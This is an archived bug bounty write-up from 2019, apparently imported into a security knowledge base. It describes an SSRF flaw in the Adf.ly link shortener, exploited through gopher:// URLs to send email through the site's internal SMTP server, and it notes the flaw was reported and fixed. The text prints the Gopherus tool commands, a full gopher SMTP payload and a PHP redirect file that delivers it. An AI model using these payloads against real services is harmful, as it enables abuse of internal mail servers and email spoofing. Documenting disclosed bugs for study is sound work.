---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-06-27_gain-adfly-smtp-access-with-ssrf-via-gopher-protocol.md
original_filename: 2019-06-27_gain-adfly-smtp-access-with-ssrf-via-gopher-protocol.md
title: Gain adfly SMTP access with SSRF via Gopher Protocol
category: documents
detected_topics:
- idor
- ssrf
- command-injection
tags:
- imported
- documents
- idor
- ssrf
- command-injection
language: en
raw_sha256: af28a86901d546a8c00e7f11e2abb62212272705a80284c9e3b89b0b268d99ce
text_sha256: b4f8ce0c03aabd3c16fa381c89a899031410b4887a18600a0503c48539c7b472
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Gain adfly SMTP access with SSRF via Gopher Protocol

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-06-27_gain-adfly-smtp-access-with-ssrf-via-gopher-protocol.md
- Source Type: markdown
- Detected Topics: idor, ssrf, command-injection
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `af28a86901d546a8c00e7f11e2abb62212272705a80284c9e3b89b0b268d99ce`
- Text SHA256: `b4f8ce0c03aabd3c16fa381c89a899031410b4887a18600a0503c48539c7b472`


## Content

---
title: "Gain adfly SMTP access with SSRF via Gopher Protocol"
url: "https://medium.com/@androgaming1912/gain-adfly-smtp-access-with-ssrf-via-gopher-protocol-26a26d0ec2cb"
authors: ["Zerb0a"]
programs: ["Adf.ly"]
bugs: ["SSRF"]
publication_date: "2019-06-27"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5179
scraped_via: "browseros"
---

# Gain adfly SMTP access with SSRF via Gopher Protocol

Gain adfly SMTP access with SSRF via Gopher Protocol
zer
Follow
2 min read
·
Jun 27, 2019

144

2

Press enter or click to view image in full size
Adfly Logo

Hi guys, My name is Rafli pasya. Today i want to share my story about SSRF on adfly, this bug i found 4 days ago and already Fixed.

Two month ago i found IDOR on adfly, and 4 days ago i found SSRF on adfly, using this vulnerability i able to send an email using adfly SMTP. it’s absolutely Dangerous if another hacker using this to attack Adfly Client.

Exploitation

i prepared this tool :
1. Gopherus
2. Server to upload php file

First of all i tried to short a Gopher:// url but it’s blocked by server. so i make a php file contains Gopherus Payload and it’s actually work.

i opened a CMD and type :
gopherus.py —exploit fastcgi
this is used to exploit fastcgi and gain RCE, unfortunally because i unable to see response body (only able to see <title> tag) this exploit not work.

So i tried to use SMTP exploit :
gopherus.py — exploit smtp
From Mail : adf@ly
To Mail : [myemail@.x.y]
Subject: PoCSSRF
Text: [empty]

Payload :
gopher://127.0.0.1:25/_MAIL%20FROM:adf%40ly%0ARCPT%20To:myemail%0ADATA%0AFrom:adf%40ly%0ASubject:PoCSSRF%0AMessage:%0A.

Now i make a php file :

<?php
header(‘location: gopher://127.0.0.1:25/_MAIL%20FROM:adf%40ly%0ARCPT%20To:myemail%0ADATA%0AFrom:adf%40ly%0ASubject:PoCSSRF%0AMessage:%0A.’);
?>

and i upload it to my server.

Get zer’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

then i visit adfly site and short myserver.com/poc.php

after 1–5 minutes i check my Inbox and see an email from adf@ly.adf.ly

Press enter or click to view image in full size

i quickly Report this bug to their team. it’s fixed 1 day after i reported the bug.

Thx for Reading, soory for bad English btw.

Original WriteUp :
https://raflipasya19.blogspot.com/2019/06/adfly-ssrf-to-smtp-takeover.html

Timeline :

- Sunday 23 June 2019 23:35 GMT+7 = Bug Found & Reported

- Monday 24 June 2019 17:16 GMT+7 = Triaged

- Monday 24 June 2019 22:34 GMT+7 = Bug Fixed
